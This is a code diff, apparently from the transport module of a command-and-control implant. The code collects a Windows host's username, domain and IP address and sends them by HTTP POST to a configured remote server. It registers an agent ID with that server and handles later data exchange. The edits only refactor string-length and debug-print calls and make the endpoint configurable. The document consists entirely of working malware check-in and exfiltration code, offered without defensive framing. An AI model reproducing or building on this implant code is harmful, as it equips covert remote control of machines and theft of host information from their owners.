@@ -69,7 +69,7 @@ BOOL TransportInit( )
         GetUserNameA( Data, (LPDWORD) &Length );
     }
 
-    PackageAddBytes( Package, Data, strlen( Data ) );
+    PackageAddBytes( Package, Data, StrLenA( Data ) );
     DATA_FREE( Data, Length );
 
     // Get Domain
@@ -86,7 +86,7 @@ BOOL TransportInit( )
     {
         if ( GetAdaptersInfo( Adapter, (PULONG) &Length ) == NO_ERROR )
         {
-            PackageAddBytes( Package, Adapter->IpAddressList.IpAddress.String, strlen( Adapter->IpAddressList.IpAddress.String ) );
+            PackageAddBytes( Package, Adapter->IpAddressList.IpAddress.String, StrLenA( Adapter->IpAddressList.IpAddress.String ) );
 
             memset( Adapter, 0, Length );
             LocalFree( Adapter );
@@ -130,19 +130,19 @@ BOOL TransportInit( )
     PackageAddInt32( Package, Instance.Config.Transport.WorkingHours );
     // End of Options
 
-    PRINT_HEX( Data, Length )
+    PRINT_HEX( Data, Length );
 
     if ( PackageTransmit( Package, &Data, &Length ) )
     {
-        printf("TRANSMITTED PACKAGE!\n");
-        PRINT_HEX( Data, Length )
+        Dbg("TRANSMITTED PACKAGE!\n");
+        PRINT_HEX( Data, Length );
 
         if ( Data )
         {
-            printf( "Agent => %x : %x\n", ( UINT32 ) DEREF( Data ), ( UINT32 ) Instance.Session.AgentID );
+            Dbg( "Agent => %x : %x\n", ( UINT32 ) DEREF( Data ), ( UINT32 ) Instance.Session.AgentID );
             if ( ( UINT32 ) Instance.Session.AgentID == ( UINT32 ) DEREF( Data ) )
             {
-                printf("CONNECTED!\n");
+                Dbg("CONNECTED!\n");
                 Instance.Session.Connected = TRUE;
                 Success = TRUE;
             }
@@ -171,36 +171,37 @@ BOOL TransportSend( LPVOID Data, SIZE_T Size, PVOID* RecvData, PSIZE_T RecvSize 
     SIZE_T  RespSize        = 0;
     BOOL    Successful      = FALSE;
 
+    HttpEndpoint = Instance.Config.Transport.Endpoint;
+
     hSession = WinHttpOpen( Instance.Config.Transport.UserAgent, HttpAccessType, HttpProxy, WINHTTP_NO_PROXY_BYPASS, 0 );
     if ( ! hSession )
     {
-        printf( "WinHttpOpen: Failed => %d\n", GetLastError() );
+        Dbg( "WinHttpOpen: Failed => %d\n", GetLastError() );
         Successful = FALSE;
         goto LEAVE;
     }
 
     hConnect = WinHttpConnect( hSession, Instance.Config.Transport.Host, Instance.Config.Transport.Port, 0 );
-    printf( "> WinHttpConnect=> %d\n", GetLastError() );
+    Dbg( "> WinHttpConnect=> %d\n", GetLastError() );
     if ( ! hConnect )
     {
-        printf( "WinHttpConnect: Failed => %d\n", GetLastError() );
+        Dbg( "WinHttpConnect: Failed => %d\n", GetLastError() );
         Successful = FALSE;
         goto LEAVE;
     }
 
-    HttpEndpoint = L"index.php";
-    HttpFlags    = WINHTTP_FLAG_BYPASS_PROXY_CACHE;
+    HttpFlags = WINHTTP_FLAG_BYPASS_PROXY_CACHE;
 
     if ( Instance.Config.Transport.Secure ){
         HttpFlags |= WINHTTP_FLAG_SECURE;
     }
 
     hRequest = WinHttpOpenRequest( hConnect, L"POST", HttpEndpoint, NULL, NULL, NULL, HttpFlags );
-    printf( "> WinHttpOpenRequest=> %d\n", GetLastError() );
+    Dbg( "> WinHttpOpenRequest=> %d\n", GetLastError() );
 
     if ( ! hRequest )
     {
-        printf( "WinHttpOpenRequest: Failed => %d\n", GetLastError() );
+        Dbg( "WinHttpOpenRequest: Failed => %d\n", GetLastError() );
         return FALSE;
     }
 
@@ -213,9 +214,9 @@ BOOL TransportSend( LPVOID Data, SIZE_T Size, PVOID* RecvData, PSIZE_T RecvSize 
 
         if ( ! WinHttpSetOption( hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &HttpFlags, sizeof( DWORD ) ) )
         {
-            printf( "WinHttpSetOption: Failed => %d\n", GetLastError() );
+            Dbg( "WinHttpSetOption: Failed => %d\n", GetLastError() );
         }else{
-            printf( "> WinHttpSetOption => %d\n", GetLastError() );
+            Dbg( "> WinHttpSetOption => %d\n", GetLastError() );
 
         }
     }
@@ -234,7 +235,7 @@ BOOL TransportSend( LPVOID Data, SIZE_T Size, PVOID* RecvData, PSIZE_T RecvSize 
                 if ( ! Successful || BufRead == 0 )
                 {
                     if ( ! Successful )
-                        printf( "WinHttpReadData: Failed (%d)\n", GetLastError() );
+                        Dbg( "WinHttpReadData: Failed (%d)\n", GetLastError() );
                     break;
                 }
 
@@ -264,7 +265,7 @@ BOOL TransportSend( LPVOID Data, SIZE_T Size, PVOID* RecvData, PSIZE_T RecvSize 
         if ( GetLastError() == 12029 ) { // ERROR_INTERNET_CANNOT_CONNECT
             Instance.Session.Connected = FALSE;
         }else {
-            printf("WinHttpSendRequest: Failed => %d\n", GetLastError());
+            Dbg("WinHttpSendRequest: Failed => %d\n", GetLastError());
         }
         Successful = FALSE;
         goto LEAVE;
